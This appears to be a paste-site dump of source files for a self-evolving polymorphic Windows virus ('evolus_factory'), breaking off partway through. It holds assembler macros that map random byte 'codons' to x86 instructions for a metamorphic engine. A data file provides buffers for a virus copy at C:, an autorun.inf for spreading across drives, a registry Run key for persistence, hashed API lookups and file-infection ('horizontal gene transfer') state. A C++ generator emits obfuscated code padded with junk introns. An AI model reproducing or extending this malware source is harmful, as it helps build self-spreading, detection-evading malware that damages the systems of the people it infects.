; @command ... macro that returns the amino acid and creates the @command.list
; _command ... how one actually calls the command (will return a random codon from @command)

CreateEmptyList @nopREAL.list
macro @nopREAL codon*
{
    CreatePaddedInstruction nop
    appendToList @nopREAL.list, codon
}
macro _nopREAL { getRandomItem @nopREAL.list }

; - - -


CreateEmptyList  @nopsA.list
macro @nopsA codon*
{
    CreatePaddedInstruction mov, ebx, eax
    appendToList @nopsA.list, codon
}
macro _nopsA { getRandomItem @nopsA.list }

; - - -

CreateEmptyList @nopsB.list
macro @nopsB codon*
{
    CreatePaddedInstruction mov, ebx, ebp
    appendToList @nopsB.list, codon
}
macro _nopsB { getRandomItem @nopsB.list }

; - - -

CreateEmptyList @nopsD.list
macro @nopsD codon*
{
    CreatePaddedInstruction mov, ebx, edx
    appendToList @nopsD.list, codon
}
macro _nopsD { getRandomItem @nopsD.list }

; - - -

CreateEmptyList @nopdA.list
macro @nopdA codon*
{
    CreatePaddedInstruction mov, eax, ebx
    appendToList @nopdA.list, codon
}
macro _nopdA { getRandomItem @nopdA.list }

; - - -

CreateEmptyList @nopdB.list
macro @nopdB codon*
{
    CreatePaddedInstruction mov, ebp, ebx
    appendToList @nopdB.list, codon
}
macro _nopdB { getRandomItem @nopdB.list }

; - - -

CreateEmptyList @nopdD.list
macro @nopdD codon*
{
    CreatePaddedInstruction mov, edx, ebx
    appendToList @nopdD.list, codon
}
macro _nopdD { getRandomItem @nopdD.list }

; - - -

CreateEmptyList @saveWrtOff.list
macro @saveWrtOff codon*
{
    CreatePaddedInstruction mov, edi, ebx
    appendToList @saveWrtOff.list, codon
}
macro _saveWrtOff { getRandomItem @saveWrtOff.list }

; - - -

CreateEmptyList @saveJmpOff.list
macro @saveJmpOff codon*
{
    CreatePaddedInstruction mov, esi, ebx
    appendToList @saveJmpOff.list, codon
}
macro _saveJmpOff { getRandomItem @saveJmpOff.list }

; - - -

CreateEmptyList @writeByte.list
macro @writeByte codon*
{
    CreatePaddedInstruction mov, byte[edi], bl
    appendToList @writeByte.list, codon
}
macro _writeByte { getRandomItem @writeByte.list }

; - - -

CreateEmptyList @writeDWord.list
macro @writeDWord codon*
{
    CreatePaddedInstruction mov, dword[edi], ebx
    appendToList @writeDWord.list, codon
}
macro _writeDWord { getRandomItem @writeDWord.list }

; - - -

CreateEmptyList @save.list
macro @save codon*
{
    CreatePaddedInstruction mov, ecx, ebx
    appendToList @save.list, codon
}
macro _save { getRandomItem @save.list }

; - - -

CreateEmptyList @addsaved.list
macro @addsaved codon*
{
    CreatePaddedInstruction add, ebx, ecx
    appendToList @addsaved.list, codon
}
macro _addsaved { getRandomItem @addsaved.list }

; - - -

CreateEmptyList @getDO.list
macro @getDO codon*
{
    CreatePaddedInstruction mov, ebx, DataOffset
    appendToList @getDO.list, codon
}
macro _getDO { getRandomItem @getDO.list }

; - - -

CreateEmptyList @getdata.list
macro @getdata codon*
{
    CreatePaddedInstruction mov, ebx, dword[ebx]
    appendToList @getdata.list, codon
}
macro _getdata { getRandomItem @getdata.list }

; - - -

CreateEmptyList @getEIP.list
macro @getEIP codon*
{
    InstrSize=6
    db 0xE8,0x00,0x00,0x00,0x00,0x5B
    times (8-InstrSize): nop	      ; padding
    appendToList @getEIP.list, codon
}
macro _getEIP { getRandomItem @getEIP.list }

; - - -

CreateEmptyList @push.list
macro @push codon*
{
    CreatePaddedInstruction push, ebx
    appendToList @push.list, codon
}
macro _push { getRandomItem @push.list }

; - - -

CreateEmptyList @pop.list
macro @pop codon*
{
    CreatePaddedInstruction pop, ebx
    appendToList @pop.list, codon
}
macro _pop { getRandomItem @pop.list }

; - - -

CreateEmptyList @pushall.list
macro @pushall codon*
{
    CreatePaddedInstruction pushad
    appendToList @pushall.list, codon
}
macro _pushall { getRandomItem @pushall.list }

; - - -

CreateEmptyList @popall.list
macro @popall codon*
{
    CreatePaddedInstruction popad
    appendToList @popall.list, codon
}
macro _popall { getRandomItem @popall.list }

; - - -


CreateEmptyList @mul.list
macro @mul codon*
{
    CreatePaddedInstruction mul, ebx
    appendToList @mul.list, codon
}
macro _mul {getRandomItem @mul.list}

; - - -

CreateEmptyList @div.list
macro @div codon*
{
    CreatePaddedInstruction div, ebx
    appendToList @div.list, codon
}
macro _div { getRandomItem @div.list }

; - - -

CreateEmptyList @shl.list
macro @shl codon*
{
    CreatePaddedInstruction shl, ebx, cl
    appendToList @shl.list, codon
}
macro _shl { getRandomItem @shl.list }

; - - -

CreateEmptyList @shr.list
macro @shr codon*
{
    CreatePaddedInstruction shr, ebx, cl
    appendToList @shr.list, codon
}
macro _shr { getRandomItem @shr.list }

; - - -

CreateEmptyList @and.list
macro @and codon*
{
    CreatePaddedInstruction and, ebx, ecx
    appendToList @and.list, codon
}
macro _and { getRandomItem @and.list }

; - - -

CreateEmptyList @xor.list
macro @xor codon*
{
    CreatePaddedInstruction xor, ebx, ecx
    appendToList @xor.list, codon
}
macro _xor { getRandomItem @xor.list }

; - - -

CreateEmptyList @add0001.list
macro @add0001 codon*
{
    CreatePaddedInstruction add, ebx, 0x0001
    appendToList @add0001.list, codon
}
macro _add0001 { getRandomItem @add0001.list }


; - - -

CreateEmptyList @sub0001.list
macro @sub0001 codon*
{
    CreatePaddedInstruction sub, ebx, 1
    appendToList @sub0001.list, codon
}
macro _sub0001 { getRandomItem @sub0001.list }

; - - -

CreateEmptyList @JnzUp.list
macro @JnzUp codon*
{
    InstrSize = 4
    db 0x74,0x02,0xFF,0xE6
    times (8-InstrSize): nop

    appendToList @JnzUp.list, codon
}
macro _JnzUp { getRandomItem @JnzUp.list }

; - - -

CreateEmptyList @JnzDown.list
macro @JnzDown codon*
{
    local StartCommand, EndCommand
    InstrSize=2
    db 0x75, 0x26
    times (8-InstrSize): nop

    appendToList @JnzDown.list, codon
}
macro _JnzDown { getRandomItem @JnzDown.list }

; - - -

CreateEmptyList @call.list
macro @call codon*
{
    CreatePaddedInstruction stdcall, ebx
    appendToList @call.list, codon
}
macro _call { getRandomItem @call.list }

; - - -

CreateEmptyList @CallAPILoadLibrary.list
macro @CallAPILoadLibrary codon*
{
    CreatePaddedInstruction stdcall, [LoadLibrary]
    appendToList @CallAPILoadLibrary.list, codon
}
macro _CallAPILoadLibrary { getRandomItem @CallAPILoadLibrary.list }

; - - -

CreateEmptyList @CallAPIMessageBox.list
macro @CallAPIMessageBox codon*
{
    CreatePaddedInstruction stdcall, [MessageBox]
    appendToList @CallAPIMessageBox.list, codon
}
macro _CallAPIMessageBox { getRandomItem @CallAPIMessageBox.list }

; - - -

CreateEmptyList @CallAPIExitProcess.list
macro @CallAPIExitProcess codon*
{
    CreatePaddedInstruction stdcall, [ExitProcess]
    appendToList @CallAPIExitProcess.list, codon
}

macro _CallAPIExitProcess { getRandomItem @CallAPIExitProcess.list }

; - - -

CreateEmptyList @int3.list
macro @int3 codon*
{
    ;CreatePaddedInstruction int3
    int 3
    times 6: nop
    appendToList @int3.list, codon
}
macro _int3 { getRandomItem @int3.list }

; - - -


macro CountListEntries [AminoAcid]
{
    display `AminoAcid,': '
    getListSize AminoAcid#.list
    displayDecNum getListSizeRV
}


macro CheckIfAllAminoAcidsAreCreated [AminoAcid]
{
    getListSize AminoAcid#.list
    if getListSizeRV=0
	display ""At least one Amino Acid"",13,10,""has no codon for mapping."",13,10,""Try to compile again!""
	err
    end if
}



macro CreateRandomAlphabet
{
    repeat 256
	cc = % - 1				     ; Starts at 1, but should start at 0
	if (cc AND 0x91)=0x91
	    @nopREAL cc   ; Splicing
	    display '@nopREAL: '
	    displayDecNum cc
	else if cc=StartCodon
	    CreatePaddedInstruction xchg, ebx, ebx   ; some No-Operation, such that its different to nopREAL and will not be target of polymorphism
	    display 'StartCodon: '
	    displayDecNum cc
	else if cc=StopCodon
	    CreatePaddedInstruction xchg, ecx, ecx   ; some No-Operation, such that its different to nopREAL and will not be target of polymorphism
	    display 'StopCodon: '
	    displayDecNum cc
	else
	    GetNewRandomNumber
	    RR = (RndNum MOD (InstructionSetSize*2)) ; (InstructionSetSize*2) because the LCG doesnt create perfect random numbers
						     ; It does not create 2^n as often as primes or (2^n +/- 1), so by taking two numbers,
						     ; a 2^n will be paired with (2^n +/- 1), thus the probability that a amino acid will
						     ; not be taken at all decreases alot. (=rare err-message at CheckIfAllAminoAcidsAreCreated)
	    if RR<2
		@nopREAL cc
		display '@nopREAL: '
		displayDecNum cc
	    else if RR<4
		@nopsA cc
		display '@nopsA: '
		displayDecNum cc
	    else if RR<6
		@nopsB cc
		display '@nopsB: '
		displayDecNum cc
	    else if RR<8
		@nopsD cc
		display '@nopsD: '
		displayDecNum cc
	    else if RR<10
		@nopdA cc
		display '@nopdA: '
		displayDecNum cc
	    else if RR<12
		@nopdB cc
		display '@nopdB: '
		displayDecNum cc
	    else if RR<14
		@nopdD cc
		display '@nopdD: '
		displayDecNum cc
	    else if RR<16
		@saveWrtOff cc
		display '@saveWrtOff: '
		displayDecNum cc
	    else if RR<18
		@saveJmpOff cc
		display '@saveJmpOff: '
		displayDecNum cc
	    else if RR<20
		@writeByte cc
		display '@writeByte: '
		displayDecNum cc
	    else if RR<22
		@writeDWord cc
		display '@writeDWord: '
		displayDecNum cc
	    else if RR<24
		@save cc
		display '@save: '
		displayDecNum cc
	    else if RR<26
		@addsaved cc
		display '@addsaved: '
		displayDecNum cc
	    else if RR<28
		@getDO cc
		display '@getDO: '
		displayDecNum cc
	    else if RR<30
		@getdata cc
		display '@getdata: '
		displayDecNum cc
	    else if RR<32
		@getEIP cc
		display '@getEIP: '
		displayDecNum cc
	    else if RR<34
		@push cc
		display '@push: '
		displayDecNum cc
	    else if RR<36
		@pop cc
		display '@pop: '
		displayDecNum cc
	    else if RR<38
		@pushall cc
		display '@pushall: '
		displayDecNum cc
	    else if RR<40
		@popall cc
		display '@popall: '
		displayDecNum cc
	    else if RR<42
		@mul cc
		display '@mul: '
		displayDecNum cc
	    else if RR<44
		@div cc
		display '@div: '
		displayDecNum cc
	    else if RR<46
		@shl cc
		display '@shl: '
		displayDecNum cc
	    else if RR<48
		@shr cc
		display '@shr: '
		displayDecNum cc
	    else if RR<50
		@and cc
		display '@and: '
		displayDecNum cc
	    else if RR<52
		@xor cc
		display '@xor: '
		displayDecNum cc
	    else if RR<54
		@add0001 cc
		display '@add0001: '
		displayDecNum cc
	    else if RR<56
		@sub0001 cc
		display '@sub0001: '
		displayDecNum cc
	    else if RR<58
		@JnzUp cc
		display '@JnzUp: '
		displayDecNum cc
	    else if RR<60
		@JnzDown cc
		display '@JnzDown: '
		displayDecNum cc
	    else if RR<62
		@call cc
		display '@call: '
		displayDecNum cc
	    else if RR<64
		@CallAPILoadLibrary cc
		display '@CallAPILoadLibrary: '
		displayDecNum cc
	    else
		@int3 cc
		display '@shl: '
		displayDecNum cc
	    end if
	end if
    end repeat
    display 13,10,'---',13,10
    CountListEntries AminoAcidList
    CheckIfAllAminoAcidsAreCreated AminoAcidList
}





macro CreateBalancedAlphabet
{
	     @nopdD 0

	     @nopdD 1

	     @nopdD 2

	     @nopdD 3

	     @addsaved 4

	     @and 5

	     @addsaved 6

	     @and 7

	     @popall 8

	     @pushall 9

	     @getdata 10

	     @pushall 11

	     @call 12

	     @add0001 13

	     @getdata 14

	     @nopdA 15

	     @push 16

	     @writeDWord 17

	     @push 18

	     @writeDWord 19

	     @push 20

	     @and 21

	     @push 22

	     @and 23

	     @getdata 24

	     @add0001 25

	     @getdata 26

	     @sub0001 27

	     @getdata 28

	     @add0001 29

	     @getdata 30

	     @and 31

	     @mul 32

	     @nopdD 33

	     @mul 34

	     @nopdD 35

	     @addsaved 36

	     @getEIP 37

	     @addsaved 38

	     @getEIP 39

	     @pop 40

	     @nopsA 41

	     @pop 42

	     @nopsA 43

	     @pop 44

	     @add0001 45

	     @JnzUp 46

	     @nopdA 47

	     @push 48

	     @writeDWord 49

	     @push 50

	     @writeDWord 51

	     @push 52

	     @saveJmpOff 53

	     @push 54

	     @saveJmpOff 55

	     @pop 56

	     @add0001 57

	     @pop 58

	     @sub0001 59

	     @pop 60

	     @add0001 61

	     @pop 62

	     @nopdA 63

	     @popall 64

	     @writeDWord 65

	     @CallAPILoadLibrary 66

	     @writeDWord 67

	     @popall 68

	     @and 69

	     @addsaved 70

	     @and 71

	     @popall 72

	     @pushall 73

	     @getdata 74

	     @pushall 75

	     @popall 76

	     @add0001 77

	     @getdata 78

	     @nopdA 79

	     @popall 80

	     @writeDWord 81

	     @push 82

	     @writeDWord 83

	     @popall 84

	     @and 85

	     @save 86

	     @and 87

	     @popall 88

	     @add0001 89

	     @getdata 90

	     @sub0001 91

	     @popall 92

	     @add0001 93

	     @getdata 94

	     @and 95

	     @saveWrtOff 96

	     @writeDWord 97

	     @saveWrtOff 98

	     @writeDWord 99

	     @saveWrtOff 100

	     @getEIP 101

	     @saveWrtOff 102

	     @nopdA 103

	     @saveWrtOff 104

	     @nopsA 105

	     @saveWrtOff 106

	     @nopsA 107

	     @saveWrtOff 108

	     @add0001 109

	     @saveWrtOff 110

	     @nopdA 111

	     @saveWrtOff 112

	     @writeDWord 113

	     @push 114

	     @writeDWord 115

	     @saveWrtOff 116

	     @saveJmpOff 117

	     @writeByte 118

	     @nopdA 119

	     @saveWrtOff 120

	     @add0001 121

	     @JnzDown 122

	     @sub0001 123

	     @saveWrtOff 124

	     @add0001 125

	     @writeByte 126

	     @nopdA 127

	     @getDO 128

	     @getDO 129

	     @getDO 130

	     @getDO 131

	     @addsaved 132

	     @shl 133

	     @addsaved 134

	     @shl 135

	     @shr 136

	     @nopREAL 137

	     @nopsB 138

	     @nopsA 139

	     @shr 140

	     @add0001 141

	     @nopdB 142

	     @nopdB 143

	     ; 144 = 0x90 = real NOP! :)
	     @nopREAL 144

	     ; SPLICING! must be NOP!!!
	     @nopREAL 145

	     @nopsB 146

	     ; SPLICING! must be NOP!!!
	     @nopREAL 147

	     @save 148

	     ; SPLICING! must be NOP!!!
	     @nopREAL 149

	     @save 150

	     ; SPLICING! must be NOP!!!
	     @nopREAL 151


_START EQU 152
ACommand152:
		     ; THIS IS THE START CODON!!!
		     ; THE bit-sequence is different to other no-operations,
		     ; such that it wont be targeted from the poly-engine
		 xchg ebx, ebx
ECommand152:
times (8-ECommand152+ACommand152): nop


	     ; SPLICING! must be NOP!!!
	     @nopREAL 153

	     @nopsB 154

	     ; SPLICING! must be NOP!!!
	     @nopREAL 155

	     @save 156

	     ; SPLICING! must be NOP!!!
	     @nopREAL 157

	     @save 158

	     ; SPLICING! must be NOP!!!
	     @nopREAL 159

	     @getDO 160

	     @getDO 161

	     @getDO 162

	     @getDO 163

	     @shl 164

	     @shl 165

	     @shl 166

	     @shl 167

	     @xor 168

	     @nopREAL 169

	     @nopsD 170

	     @nopsA 171

	     @shl 172

	     @add0001 173

	     @nopsD 174

	     @nopdB 175


_STOP EQU 176
ACommand176:
		     ; THIS IS THE STOP CODON!!!
		     ; THE bit-sequence is different to other no-operations,
		     ; such that it wont be targeted from the poly-engine
		 xchg ecx, ecx
ECommand176:
times (8-ECommand176+ACommand176): nop


	     ; SPLICING! must be NOP!!!
	     @nopREAL 177

	     @div 178

	     ; SPLICING! must be NOP!!!
	     @nopREAL 179

	     @save 180

	     ; SPLICING! must be NOP!!!
	     @nopREAL 181

	     @save 182

	     ; SPLICING! must be NOP!!!
	     @nopREAL 183

	     @xor 184

	     ; SPLICING! must be NOP!!!
	     @nopREAL 185

	     @nopsD 186

	     ; SPLICING! must be NOP!!!
	     @nopREAL 187

	     @save 188

	     ; SPLICING! must be NOP!!!
	     @nopREAL 189

	     @save 190

	     ; SPLICING! must be NOP!!!
	     @nopREAL 191

	     @getDO 192

	     @add0001 193

	     @getDO 194

	     @getDO 195

	     @addsaved 196

	     @shl 197

	     @addsaved 198

	     @shl 199

	     @shr 200

	     @nopREAL 201

	     @nopsB 202

	     @nopsA 203

	     @addsaved 204

	     @add0001 205

	     @nopdB 206

	     @nopdB 207

	     @sub0001 208

	     ; SPLICING! must be NOP!!!
	     @nopREAL 209

	     @nopsB 210

	     ; SPLICING! must be NOP!!!
	     @nopREAL 211

	     @save 212

	     ; SPLICING! must be NOP!!!
	     @nopREAL 213

	     @save 214

	     ; SPLICING! must be NOP!!!
	     @nopREAL 215

	     @sub0001 216

	     ; SPLICING! must be NOP!!!
	     @nopREAL 217

	     @nopsB 218

	     ; SPLICING! must be NOP!!!
	     @nopREAL 219

	     @save 220

	     ; SPLICING! must be NOP!!!
	     @nopREAL 221

	     @save 222

	     ; SPLICING! must be NOP!!!
	     @nopREAL 223

	     @getDO 224

	     @getDO 225

	     @getDO 226

	     @getDO 227

	     @shl 228

	     @shl 229

	     @shl 230

	     @shl 231

	     @xor 232

	     @nopREAL 233

	     @nopsD 234

	     @nopsA 235

	     @shl 236

	     @add0001 237

	     @nopsD 238

	     @nopdB 239

	     @xor 240

	     ; SPLICING! must be NOP!!!
	     @nopREAL 241

	     @div 242

	     ; SPLICING! must be NOP!!!
	     @nopREAL 243

	     @save 244

	     ; SPLICING! must be NOP!!!
	     @nopREAL 245

	     @save 246

	     ; SPLICING! must be NOP!!!
	     @nopREAL 247

	     @xor 248

	     ; SPLICING! must be NOP!!!
	     @nopREAL 249

	     @nopsD 250

	     ; SPLICING! must be NOP!!!
	     @nopREAL 251

	     @save 252

	     ; SPLICING! must be NOP!!!
	     @nopREAL 253

	     @save 254

	     ; SPLICING! must be NOP!!!
	     @nopREAL 255



;1380: Energy!: 1055.83


}


macro CreateAlphabet
{
    CreateBalancedAlphabet
;    CreateRandomAlphabet
}"
fUn4SHSy,evolus_factory/data_n_equs.inc,FlyFar,MPASM,Thursday 27th of July 2023 01:57:25 AM CDT,"; ############################################################################
; ############################################################################
; #####
; ##### CONSTANT DEFINITION
; #####

  StartCodon EQU 0x98
  StopCodon  EQU 0xB0

  CodeStart EQU 0x600

  ; One out of n bytes will be changed: 7 > n > (2^32 - 1)

					      ; THIS SHOULD BE A PRIME
					      ; FOR GOOD RANDOMNESS!
  IntronInsertThreshold EQU 5

  VarThreshold1 	EQU 25013
  xchgThreshold1	EQU 104729
  InsertThreshold1	EQU 5
  HGTThreshold1 	EQU 5

; #####
; ##### CONSTANT DEFINITION
; #####
; ############################################################################
; ############################################################################




; ############################################################################
; ############################################################################
; #####
; #####   DATA
; #####

DataOffset:
	PseudoRegC	dd 0x0		 ; Pseudo-Register, interact with nopsC and nopdC
					 ; Just for internal useage, dont use that in code!
					 ; If the relative position to DataOffset will change,
					 ; also change it in instruction_set_macro.inc in _nopdC and _nopsC-macro
					 ; (some additionals _add0001s, NOT addnumber-macro useage!)

	Place4Life	dd 0x0
	RandomNumber	dd 0x0


			db 0x0
	   Driveletter1 db 0x0
			db 0x0, 0x0	 ; buffer for "":\""

	RandomFileName: times 8 db 0x0	 ; buffer for random filename
	   rndext:	times 4 db 0x0	 ; .exe
			db 0x0

			db 0x0
	   Driveletter2 db 0x0
			db 0x0, 0x0	; buffer for "":\""

	   autoruninf:	times 11 db 0x0
			db 0x0


			db 0x0
	   Driveletter3 db 0x0, 0x0, 0x0     ; buffer for ""C:\""

	   virusname:	times 8 db 0x0	     ; virus filename at C:
	   virext:	times 4 db 0x0	     ; .exe
			db 0x0

	RandomFileName2: times 8 db 0x0   ; buffer for random filename
	   rndext2:	 times 4 db 0x0   ; .exe
			db 0x0

	FileHandle	dd 0x0
	MapHandle	dd 0x0
	MapPointer	dd 0x0
	FileSize	dd 0x0

	stDLLkernel32: times 12 db 0x0
		      db 0x0
	stDLLadvapi32: times 12 db 0x0
		      db 0x0

	hDLLlibrary32  dd 0x0

	hAddressTable dd 0x0
	hNamePointerTable dd 0x0
	hOrdinalTable dd 0x0

	APINumber dd 0x0

   APINumberKernel EQU (APIMagicNumbersKernelEnd-APIMagicNumbersKernel)/4
   APINumberAdvapi EQU (APIMagicNumbersRegEnd-APIMagicNumbersReg)/4

	APITmpBuffer dd 0x0
	hMagicNumberPointer dd 0x0

   APIMagicNumbersKernel:
	mCloseHandle dd 0x0 ; 0x0342
	mCopyFileA   dd 0x0 ; 0x0C5C
	mCreateFileA dd 0x0 ; 0x0615
	mCreateFileMappingA dd 0x0 ; 0x04E1
	mCreateProcessA   dd 0x0 ; 0x0674
	mGetDriveTypeA	  dd 0x0 ; 0x0AFD
	mGetCommandLineA  dd 0x0 ; 0x06A8
	mGetFileSize	  dd 0x0 ; 0x083B
	mWriteFile	  dd 0x0 ; 0x078B
	mGetTickCount	  dd 0x0 ; 0x01B4
	mMapViewOfFile	  dd 0x0 ; 0x05EE
	mSleep		  dd 0x0 ; 0x07F9
	mFindFirstFileA   dd 0x0 ; 0x094A
	mFindNextFileA	  dd 0x0 ; 0x0FE1
	mUnmapViewOfFile  dd 0x0 ; 0x01D1
	mSetErrorMode	  dd 0x0 ; 0x0CBB
   APIMagicNumbersKernelEnd:

   APIMagicNumbersReg:
	mRegCreateKeyA	  dd 0x0 ; 0x0EDC
	mRegSetValueExA   dd 0x0 ; 0x0845
;        mRegCloseKey      dd 0x0F3D
   APIMagicNumbersRegEnd:


	hAddressePointer dd 0x0
   APIAddresses:
	hCloseHandle dd 0x0
	hCopyFileA   dd 0x0
	hCreateFileA dd 0x0
	hCreateFileMappingA dd 0x0
	hCreateProcessA   dd 0x0
	hGetDriveTypeA	  dd 0x0
	hGetCommandLineA  dd 0x0
	hGetFileSize	  dd 0x0
	hWriteFile	  dd 0x0
	hGetTickCount	  dd 0x0
	hMapViewOfFile	  dd 0x0
	hSleep		  dd 0x0
	hFindFirstFileA   dd 0x0
	hFindNextFileA	  dd 0x0
	hUnmapViewOfFile  dd 0x0
	hSetErrorMode	  dd 0x0

   APIAddressesReg:
	hRegCreateKeyA	  dd 0x0
	hRegSetValueExA   dd 0x0
;        hRegCloseKey      dd 0x0



	xchgBuffer dd 0x0

	InsStart dd 0x0
	InsEnd	 dd 0x0
	nBlockSize	dd 0x0
	nByteBlockToMov dd 0x0

	stSubKey: times 46 db 0x0 ; SOFTWARE\Microsoft\Windows\CurrentVersion\Run
				  ; will be created at runtime

	hRegKey dd 0x0

	AutoStartContentStart: times 51 db 0x0
	AutoStartContentEnd:




StartUp_struct:
  StartUp_struct_cb		 dd 0
  StartUp_struct_lpReserved	 dd 0
  StartUp_struct_lpDesktop	 dd 0
  StartUp_struct_lpTitle	 dd 0
  StartUp_struct_dwX		 dd 0
  StartUp_struct_dwY		 dd 0
  StartUp_struct_dwXSize	 dd 0
  StartUp_struct_dwYSize	 dd 0
  StartUp_struct_dwXCountChars	 dd 0
  StartUp_struct_dwYCountChars	 dd 0
  StartUp_struct_dwFillAttribute dd 0
  StartUp_struct_dwFlags	 dd 0
  StartUp_struct_wShowWindow	 dw 0
  StartUp_struct_cbReserved2	 dw 0
  StartUp_struct_lpReserved2	 dd 0
  StartUp_struct_hStdInput	 dd 0
  StartUp_struct_hStdOutput	 dd 0
  StartUp_struct_hStdError	 dd 0


ProcessInfo_struct:
  PROCESS_INFORMATION_hProcess	  dd 0
  PROCESS_INFORMATION_hThread	  dd 0
  PROCESS_INFORMATION_dwProcessId dd 0
  PROCESS_INFORMATION_dwThreadId  dd 0




; *********************************
; *** Horizontal_gene_transfer_data

WIN32_FIND_DATA_struct:
  WIN32_FIND_DATA_dwFileAttributes   dd 0
  WIN32_FIND_DATA_ftCreationTime     FILETIME
  WIN32_FIND_DATA_ftLastAccessTime   FILETIME
  WIN32_FIND_DATA_ftLastWriteTime    FILETIME
  WIN32_FIND_DATA_nFileSizeHigh      dd 0
  WIN32_FIND_DATA_nFileSizeLow	     dd 0
  WIN32_FIND_DATA_dwReserved0	     dd 0
  WIN32_FIND_DATA_dwReserved1	     dd 0
  WIN32_FIND_DATA_cFileName	     db MAX_PATH dup (0)
  WIN32_FIND_DATA_cAlternateFileName db 14 dup (0)

	HGT_searchmask	   dd 0x0

	HGT_FFHandle	   dd 0x0


	HGTFileHandle	   dd 0x0
	HGTMapHandle	   dd 0x0
	HGTMapPointer	   dd 0x0
	HGTFileSize	   dd 0x0
	HGTDidInsert	   dd 0x0

; *********************************
; *** Redundancy polymorphism

	RPAminoAcid1	dd 0x0
	RPAminoAcid2	dd 0x0

; #####
; #####   DATA
; #####
; ############################################################################
; ############################################################################"
UamnHbpC,evolus_factory/cii.cpp,FlyFar,C++,Thursday 27th of July 2023 01:56:50 AM CDT,"#include <cstdlib>
#include <iostream>
#include <fstream>
#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <list>
#include <math.h>
#include <sstream>
#include <vector>

using namespace std;

ofstream file;

string I2S(double n)
{
  stringstream out;
  out << n;
  string rv = out.str();
  return(rv);
}


void addnumber(string BigNum);
void GetAddress(string address);
void CallAPI(string APIName);
void CalcNewRandNumberAndSaveIt(); 
void nopdC();
void nopsC();
void zer0(int rr);
void subsaved(int rr);


#define IntronInsertThreshold 11
int IntronSTST;
int IntronNOP;
void CreateAnIntron()
{
     if (!(rand()%IntronInsertThreshold))
     {
         if (rand()%6)
         {
             // Here we use START+STOP intron
             
             file << ""db StopCodon"" << endl;
             while(rand()%31)
             {
                 
                 file << ""db "" << I2S((rand()%255)^0x67) << endl;
             }             
             file << ""db StartCodon"" << endl;
             IntronSTST++;
         }
         else
         {
             while(rand()%31)
             {                 
                 //file << ""db "" << I2S((rand()%255)|0x91) << endl;
                 file << ""_nopREAL"" << endl;                                               
             }
             IntronNOP++;
         }         
     }
}

void addnumber(string BigNum)
{
        file << ""    BigNum="" << BigNum << endl;
        file << ""    AlreadyStarted=0"" << endl; CreateAnIntron();
        file << ""    if BigNum<25"" << endl; CreateAnIntron();
        file << ""        repeat BigNum"" << endl;
        file << ""            _add0001"" << endl;
        file << ""        end repeat"" << endl;
        file << ""    else"" << endl;
        file << ""        _pushall"" << endl; CreateAnIntron();
        file << ""        _push  ; BC1 to stack"" << endl;
        file << ""        _save"" << endl; CreateAnIntron();
        file << ""        _xor   ; BC1=0"" << endl;
        file << ""        _add0001"" << endl; CreateAnIntron();
        file << ""        _save"" << endl;
        file << ""        _sub0001 ; BC1=0, BC2=1"" << endl; CreateAnIntron();
        file << ""        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1"" << endl;
        file << ""        {"" << endl;
        file << ""            if AlreadyStarted=1"" << endl;
        file << ""                _shl"" << endl;
        file << ""            end if"" << endl;
        file << ""            if (BigNum AND num)>0"" << endl;
        file << ""                _add0001"" << endl;
        file << ""                AlreadyStarted=1"" << endl;
        file << ""            end if"" << endl;
        file << ""        }"" << endl;
        file << ""        _save           ; BC2=BigNum"" << endl; CreateAnIntron();
        file << ""        _pop            ; restore BC1"" << endl;
        file << ""        _addsaved       ; BC1=BC1+BigNum"" << endl; CreateAnIntron();
        nopdC();
        file << ""        _popall         ; Restore all registers"" << endl;
        nopsC();
        file << ""        _pushall        ; Restore ZF"" << endl; CreateAnIntron();
        file << ""        _save"" << endl;
        file << ""        _and"" << endl;
        file << ""        _popall"" << endl;
        file << ""    end if"" << endl;

}  



void GetAddress(string address)
{
        file << ""    _getDO"" << endl; CreateAnIntron();
        string tmpstr=address+""-DataOffset""; CreateAnIntron();
        addnumber(tmpstr);
} 


void CallAPI(string APIName)
{
        file << ""    _getDO"" << endl; CreateAnIntron();
        string tmpstr=APIName+""-DataOffset"";
        addnumber(tmpstr); CreateAnIntron();
        file << ""    _getdata"" << endl;
        file << ""    _call"" << endl; CreateAnIntron();
}

void CalcNewRandNumberAndSaveIt()
{
        GetAddress(""RandomNumber"");
        file << ""        _saveWrtOff"" << endl; CreateAnIntron();
        file << ""        _getdata"" << endl; CreateAnIntron();
        file << ""        _nopdA                   ; eax=[RandomNumber]"" << endl; CreateAnIntron();
        zer0(0);
        addnumber(""1103515245"");        
        file << ""        _mul                     ; eax*=1103515245 % 2^32"" << endl; CreateAnIntron();
        zer0(0);
        addnumber(""12345"");     CreateAnIntron();
        file << ""        _save"" << endl;
        file << ""        _nopsA"" << endl; CreateAnIntron();
        file << ""        _addsaved                ; eax+=12345 % 2^32"" << endl;
        file << ""        _writeDWord              ; mov [RandomNumber], ebx"" << endl; CreateAnIntron();
}

void nopdC()
{
    file << ""        _pushall                ; save all registers"" << endl; CreateAnIntron();
    file << ""        _push                   ; save BC1"" << endl; CreateAnIntron();
    file << ""        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists."" << endl; CreateAnIntron();
    file << ""        _saveWrtOff             ; BA1=RegC"" << endl; CreateAnIntron();
    file << ""        _pop"" << endl; CreateAnIntron();
    file << ""        _writeDWord             ; mov dword[RegC], BC1"" << endl; CreateAnIntron();
    file << ""        _popall                 ; restore all registers"" << endl; CreateAnIntron();
} 


void nopsC()
{
    file << ""        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists."" << endl; CreateAnIntron();
    file << ""        _getdata"" << endl; CreateAnIntron();
}



void zer0(int rr)
{
    if (rr!=0)
    {
        file << ""_pushall"" << endl; CreateAnIntron();
    }

    file << ""_save           ; BC2=BC1"" << endl; CreateAnIntron();
    file << ""_xor            ; BC1=BC1 XOR BC2 = 0"" << endl; CreateAnIntron();

    if (rr!=0)
    {
        nopdC();
        file << ""_popall"" << endl;
        nopsC(); CreateAnIntron();
    }
}


void subsaved(int rr)
{
    if (rr!=0)
    {
        file << ""        _pushall"" << endl; CreateAnIntron();
    }
        file << ""        _push           ; save BC1"" << endl; CreateAnIntron();
        zer0(1);
